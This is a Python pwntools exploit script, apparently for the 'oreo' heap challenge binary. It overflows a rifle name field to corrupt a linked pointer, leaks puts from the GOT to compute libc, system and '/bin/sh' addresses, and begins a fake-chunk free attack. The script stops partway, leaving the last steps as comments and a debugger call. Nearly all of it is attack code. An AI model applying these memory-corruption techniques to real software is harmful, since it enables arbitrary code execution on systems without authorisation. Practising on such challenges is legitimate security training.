#!/usr/bin/env python

from pwn import *

context.log_level = 'debug'

r = process('./oreo')
elf = ELF("./oreo")
libc = ELF("./libc.so.6")

def debug():
	gdb.attach(r)
	pause()

def add(name, descript):
	# r.recvuntil("Action: ")
	r.sendline("1")
	# r.recvuntil("Rifle name: ")
	r.sendline(name)
	# r.recvuntile("Rifle description: ")
	r.sendline(descript)


def show():
	# r.recvuntil("Action: ") 
	r.sendline('2')
	r.recvuntil("===================================\n")

def order():
	# r.recvuntil("Action: ")
	r.sendline("3")

def message(notice):
	# r.recvuntil("Action: ")
	r.sendline("4")
	# r.recvuntil("Enter any notice you'd like to submit with your order: ")
	r.sendline(notice)

def exp():
	# r.recvuntil("Exit!\n")
	#r.recv()
	print("[*] leak libc base address...")
	payload = 'a'*27 + p32(elf.got["puts"])
	add(payload, b'a'*25)
	show()
	r.recvuntil("===================================\n")
	r.recvuntil("Description: ")
	puts_addr = u32(r.recvuntil('\n')[:4])
	libc_base = puts_addr - libc.symbols['puts']
	system_addr = libc_base + libc.symbols['system']
	binsh_addr = libc_base + next(libc.search("/bin/sh"))

	print("free fake chunk at 0x0804A2A8")

	# now, rifle_cnt=1, we need set it = 0x40
	oifle = 1
	while oifle < 0x3f:
		# set next link = NULL
		add('a'*27 + p32(0), 'b'*25)
		oifle += 1
	
	payload = 'a'*27 + p32(0x0804A2A8)
	# set next link=0x0804A2A8, try to free a fake chunk
	add(payload, 'a' * 25)
	# before free, we need to bypass some check
	# fake chunk's size is 0x40
	# 0x20 *'a' for padding the last fake chunk
	# 0x40 for fake chunk's next chunk's prev_size
	# 0x100 for fake chunk's next chunk's size
	# set fake iofle' next to be NULL
	debug()


	r.interactive()



if __name__ == "__main__":
	exp()

